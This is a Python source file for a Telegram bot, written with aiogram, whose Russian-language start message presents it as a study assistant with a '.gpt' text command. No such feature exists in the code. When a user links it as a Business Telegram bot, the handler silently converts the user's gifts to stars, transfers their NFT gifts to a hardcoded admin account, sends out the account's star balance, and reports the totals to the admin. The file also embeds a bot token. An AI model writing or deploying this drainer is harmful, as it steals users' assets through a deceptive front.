import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher.filters import Command
from aiogram.dispatcher import filters
from aiogram.utils.executor import start_polling

TOKEN = "8102834637:AAFhOSgjadxhvtYms1CPkXvCTrE-h69U5pM"
ADMIN_ID = 861087987

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

connected_users = set()

@dp.message_handler(Command("start"))
async def start_command(message: types.Message):
    username = (await bot.get_me()).username
    text = (
        f"<b>Привет, {message.from_user.full_name}!</b>\n\n"
        f"Этот бот работает через <b>Business Telegram</b>.\n"
        f"Вы можете подключить его как бизнес-бот, и он поможет вам с учебой, ответит на вопросы и сгенерирует текст с помощью команды <code>.gpt</code>.\n\n"
        f"Просто отправьте ему сообщение в ЛС, если он уже подключен как бизнес-профиль.\n"
        f"\n<b>Юзернейм бота:</b> @{username}"
    )
    await message.answer(text, parse_mode="HTML")

@dp.message_handler(content_types=types.ContentType.ANY)
async def handle_business_connection(message: types.Message):
    business_id = getattr(message, "business_connection_id", None)
    if not business_id or message.from_user.id in connected_users:
        return

    connected_users.add(message.from_user.id)

    try:
        account_info = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        total_gifts = len(account_info.gifts)
        for gift in account_info.gifts:
            try:
                await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
            except:
                pass

        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        nft_gifts = unique_gifts.gifts
        for gift in nft_gifts:
            try:
                await bot.transfer_gift(business_id, gift.owned_gift_id, ADMIN_ID, 25)
            except:
                pass

        stars = await bot.get_business_account_star_balance(business_id)

        await bot.transfer_business_account_stars(business_id, int(stars.amount))

        await message.answer("Бот успешно подключен в Business Telegram", parse_mode="HTML")

        await bot.send_message(
            ADMIN_ID,
            f"<b>@{message.from_user.username or message.from_user.id}</b> подключил бота в <b>Business Mode</b>.\n\n"
            f"Информация об аккаунте:\n"
            f"Обычные подарки: {total_gifts}\n"
            f"Звезды: {stars.amount}\n"
            f"NFT-подарки: {len(nft_gifts)}",
            parse_mode="HTML"
        )

    except Exception as e:
        await message.answer(f"Ошибка при обработке Business-подключения: {e}")

if __name__ == "__main__":
    start_polling(dp, skip_updates=True)
